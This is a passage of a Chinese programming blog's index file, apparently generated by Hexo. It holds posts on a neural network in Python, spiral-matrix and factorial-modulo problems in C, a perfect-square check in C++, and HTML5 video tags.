class="token punctuation">.</span>shape<span class="token punctuation">)</span>      dAL <span class="token operator">=</span> <span class="token operator">-</span> <span class="token punctuation">(</span>np<span class="token punctuation">.</span>divide<span class="token punctuation">(</span>Y<span class="token punctuation">,</span> AL<span class="token punctuation">)</span> <span class="token operator">-</span> np<span class="token punctuation">.</span>divide<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> Y<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">-</span> AL<span class="token punctuation">)</span><span class="token punctuation">)</span>      current_cache <span class="token operator">=</span> caches<span class="token punctuation">[</span>L<span class="token number">-1</span><span class="token punctuation">]</span>      grads<span class="token punctuation">[</span><span class="token string">"dA"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> grads<span class="token punctuation">[</span><span class="token string">"dW"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> grads<span class="token punctuation">[</span><span class="token string">"db"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span>     linear_activation_backward<span class="token punctuation">(</span>dAL<span class="token punctuation">,</span> current_cache<span class="token punctuation">,</span> <span class="token string">"sigmoid"</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> l <span class="token keyword">in</span> reversed<span class="token punctuation">(</span>range<span class="token punctuation">(</span>L<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          current_cache <span class="token operator">=</span> caches<span class="token punctuation">[</span>l<span class="token punctuation">]</span>          dA_prev_temp<span class="token punctuation">,</span> dW_temp<span class="token punctuation">,</span> db_temp <span class="token operator">=</span> linear_activation_backward<span class="token punctuation">(</span>grads<span class="token punctuation">[</span><span class="token string">"dA"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>l<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                                                   current_cache<span class="token punctuation">,</span> <span class="token string">"relu"</span><span class="token punctuation">)</span>          grads<span class="token punctuation">[</span><span class="token string">"dA"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> dA_prev_temp          grads<span class="token punctuation">[</span><span class="token string">"dW"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> dW_temp          grads<span class="token punctuation">[</span><span class="token string">"db"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> db_temp      <span class="token keyword">return</span> grads  <span class="token keyword">def</span> <span class="token function">update_parameters</span><span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> grads<span class="token punctuation">,</span> learning_rate<span class="token punctuation">)</span><span class="token punctuation">:</span>      L <span class="token operator">=</span> len<span class="token punctuation">(</span>parameters<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>      <span class="token keyword">for</span> l <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>          parameters<span class="token punctuation">[</span><span class="token string">"W"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"W"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">-</span> learning_rate<span class="token operator">*</span>grads<span class="token punctuation">[</span><span class="token string">"dW"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>          parameters<span class="token punctuation">[</span><span class="token string">"b"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"b"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">-</span> learning_rate<span class="token operator">*</span>grads<span class="token punctuation">[</span><span class="token string">"db"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>      <span class="token keyword">return</span> parameters      <span class="token comment" spellcheck="true"># 搭建多层神经网络  </span><span class="token keyword">def</span> <span class="token function">L_layer_model</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> layerdims<span class="token punctuation">,</span> learning_rate<span class="token operator">=</span><span class="token number">0.0075</span><span class="token punctuation">,</span> num_iterations<span class="token operator">=</span><span class="token number">3000</span><span class="token punctuation">,</span> print_cost<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>isPlot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>      costs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>      parameters <span class="token operator">=</span> initialize_parameters_deep<span class="token punctuation">(</span>layerdims<span class="token punctuation">)</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>num_iterations<span class="token punctuation">)</span><span class="token punctuation">:</span>          AL<span class="token punctuation">,</span> caches <span class="token operator">=</span> L_model_forward<span class="token punctuation">(</span>X<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span>          cost <span class="token operator">=</span> compute_cost<span class="token punctuation">(</span>AL<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>          grads <span class="token operator">=</span> L_model_backward<span class="token punctuation">(</span>AL<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> caches<span class="token punctuation">)</span>          parameters <span class="token operator">=</span> update_parameters<span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> grads<span class="token punctuation">,</span> learning_rate<span class="token punctuation">)</span>          <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>              costs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cost<span class="token punctuation">)</span>              <span class="token keyword">if</span> print_cost<span class="token punctuation">:</span>                  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token string">"次迭代,成本值为: "</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>squeeze<span class="token punctuation">(</span>cost<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">if</span> isPlot<span class="token punctuation">:</span>          plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>np<span class="token punctuation">.</span>squeeze<span class="token punctuation">(</span>costs<span class="token punctuation">)</span><span class="token punctuation">)</span>          plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'cost'</span><span class="token punctuation">)</span>          plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'iterations (per tens)'</span><span class="token punctuation">)</span>          plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Learning rate ="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>learning_rate<span class="token punctuation">)</span><span class="token punctuation">)</span>          plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> parameters  <span class="token keyword">def</span> <span class="token function">predict</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> y<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span><span class="token punctuation">:</span>      m <span class="token operator">=</span> X<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>      n <span class="token operator">=</span> len<span class="token punctuation">(</span>parameters<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>       p <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>      probas<span class="token punctuation">,</span> caches <span class="token operator">=</span> L_model_forward<span class="token punctuation">(</span>X<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> probas<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> probas<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0.5</span><span class="token punctuation">:</span>              p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"准确度为: "</span>  <span class="token operator">+</span> str<span class="token punctuation">(</span>float<span class="token punctuation">(</span>np<span class="token punctuation">.</span>sum<span class="token punctuation">(</span><span class="token punctuation">(</span>p <span class="token operator">==</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> p  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 吴恩达深度学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>螺旋序列的输出</title>
      <link href="/2019/04/03/2019-suan-fa-ri-chang-luo-xuan-xu-lie/"/>
      <url>/2019/04/03/2019-suan-fa-ri-chang-luo-xuan-xu-lie/</url>
      
        <content type="html"><![CDATA[<h2 id="我的算法日常-—-螺旋数字串"><a href="#我的算法日常-—-螺旋数字串" class="headerlink" title="我的算法日常 — 螺旋数字串"></a>我的算法日常 — 螺旋数字串</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><ul><li>输入n输入行列n个数字的矩阵  </li><li>形如  <pre><code>  10 11 12 1    9 16 13 2    8 15 14 3    7 6 5 4  </code></pre>  <code>螺旋递增序列</code>  </li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>螺旋递增也就是,下–左–上–右–下递增  </li><li>也就是只有四种递增方向  </li><li>接着寻找每一种的递增截至的条件  </li><li>发现当且仅当x,y满足关于n和0的关系并且前面的数据还没有被赋值时  </li></ul><h3 id="实现C代码"><a href="#实现C代码" class="headerlink" title="实现C代码"></a>实现C代码</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span>  </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span>  </span><span class="token macro property"># <span class="token directive keyword">define</span> maxn 20  </span><span class="token keyword">int</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token keyword">int</span> n<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> tot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      tot <span class="token operator">=</span> a<span class="token punctuation">[</span>x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token operator">=</span>n<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">while</span><span class="token punctuation">(</span>tot <span class="token operator">&lt;</span> n<span class="token operator">*</span>n<span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">while</span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token operator">&lt;</span>n <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>a<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span><span class="token operator">++</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">++</span> tot<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//向下  </span>        <span class="token keyword">while</span><span class="token punctuation">(</span>y<span class="token number">-1</span><span class="token operator">>=</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>a<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">--</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">++</span>tot<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//向左  </span>        <span class="token keyword">while</span><span class="token punctuation">(</span>x<span class="token number">-1</span><span class="token operator">>=</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>a<span class="token punctuation">[</span>x<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span><span class="token operator">--</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">++</span> tot<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//向上  </span>        <span class="token keyword">while</span><span class="token punctuation">(</span>y<span class="token operator">+</span><span class="token number">1</span><span class="token operator">&lt;</span>n <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>a<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">++</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">++</span>tot<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//向右  </span>    <span class="token punctuation">}</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>j <span class="token operator">++</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>              <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAT </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断完全平方数</title>
      <link href="/2019/04/02/2019-suan-fa-ri-chang-wan-quan-ping-fang/"/>
      <url>/2019/04/02/2019-suan-fa-ri-chang-wan-quan-ping-fang/</url>
      
        <content type="html"><![CDATA[<h1 id="我的算法日常—判断完全平方数"><a href="#我的算法日常—判断完全平方数" class="headerlink" title="我的算法日常—判断完全平方数"></a>我的算法日常—判断完全平方数</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>先对数据a进行开方的到b  </li><li>之后b对其进行四舍五入，得到一个整数c  </li><li>当且仅当 b==c 时 c**2 == a  </li><li>所以就可以判断a是否为完全平方数了  </li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>n 为存在某一整数  </li><li>当b &lt; n + 0.5 时 b &gt; c =&gt; c**2 &lt; a  </li><li>当b &gt;= n + 0.5 时 b &lt; c =&gt; c**2 &gt; a  </li><li>当b == n 时 b == c =&gt; c**2 == a  </li><li>所以当且仅当 c**2 == a 时 a 为完全平方数  </li></ul><h2 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h2><pre class="line-numbers language-c++"><code class="language-c++">#include<iostream>  #include<cmath>   using namespace std;   int main()   {      int a;      cin>>a;      int b = floor(sqrt(a) + 0.5);      if(a == b*b) cout<<a<<' '<<"完全平方数"<<endl;      else cout<<a<<' '<<"不是完全平方数"<<endl;      return 0;  }  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阶乘取模</title>
      <link href="/2019/04/02/2019-suan-fa-ri-chang-jie-cheng-qu-mo/"/>
      <url>/2019/04/02/2019-suan-fa-ri-chang-jie-cheng-qu-mo/</url>
      
        <content type="html"><![CDATA[<h2 id="我的算法日常-—-超大的阶乘取模"><a href="#我的算法日常-—-超大的阶乘取模" class="headerlink" title="我的算法日常 — 超大的阶乘取模"></a>我的算法日常 — 超大的阶乘取模</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><ul><li>输入<code>n &lt; 10**6</code>  </li><li>求1!+2!+…..n! 对<code>1000000</code>的模  </li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>首先n特别大,容易超时  </li><li>阶乘特别大那就每次都对<code>1000000</code>取模,阶乘时和最后相加都进行取模操作  </li><li>试着找规律,<code>25!</code>的后六位均为零,所以25之后的阶乘都将无法影响最后结果的后六位  </li></ul><h3 id="实现C代码"><a href="#实现C代码" class="headerlink" title="实现C代码"></a>实现C代码</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span>   </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;time.h></span>   </span><span class="token comment" spellcheck="true">//时间头文件    </span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token keyword">int</span> MOD <span class="token operator">=</span> <span class="token number">1000000</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> n<span class="token punctuation">,</span> S <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">25</span><span class="token punctuation">)</span> n <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">int</span> factorial <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>j <span class="token operator">&lt;=</span> i<span class="token punctuation">;</span>j <span class="token operator">++</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>              factorial <span class="token operator">=</span> <span class="token punctuation">(</span>factorial <span class="token operator">*</span> j<span class="token punctuation">)</span> <span class="token operator">%</span> MOD<span class="token punctuation">;</span>          <span class="token punctuation">}</span>          S <span class="token operator">=</span> <span class="token punctuation">(</span>S <span class="token operator">+</span> factorial<span class="token punctuation">)</span> <span class="token operator">%</span> MOD<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> S<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Time used = % 0.2f\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> CLOCKS_PER_SEC<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//时间除以常数的单位才是秒  </span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="收获的小技巧"><a href="#收获的小技巧" class="headerlink" title="收获的小技巧"></a>收获的小技巧</h3><ul><li>这种特别大的输入一般都有规律,可以试着去多输入几组,寻找规律  </li><li>命令行的<code>管道输入&quot;echo 输入数据|程序名&quot;</code>可以消除输入数据所消耗的时间,从而的到程序处理数据的实际时间  </li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML5</title>
      <link href="/2019/04/01/2019-html5/"/>
      <url>/2019/04/01/2019-html5/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><h3 id="基础源码"><a href="#基础源码" class="headerlink" title="基础源码"></a>基础源码</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE HTML></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>G:\\桌面\\1.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   Your browser does not support the video tag.   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>control 属性供添加播放、暂停和音量控件。  </p></li><li><p>包含宽度和高度属性也是不错的主意。   </p></li><li><p><code>&lt;video&gt; 与 &lt;/video&gt;</code> 之间插入的内容是供不支持 video 元素的浏览器显示的  </p></li><li><p>video 元素允许多个 source 元素。source 元素可以链接不同的视频文件。浏览器将使用第一个可识别的格 式  </p><pre class="line-numbers language-html"><code class="language-html">  <span class="token doctype">&lt;!DOCTYPE HTML></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/i/movie.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/ogg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/i/movie.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token 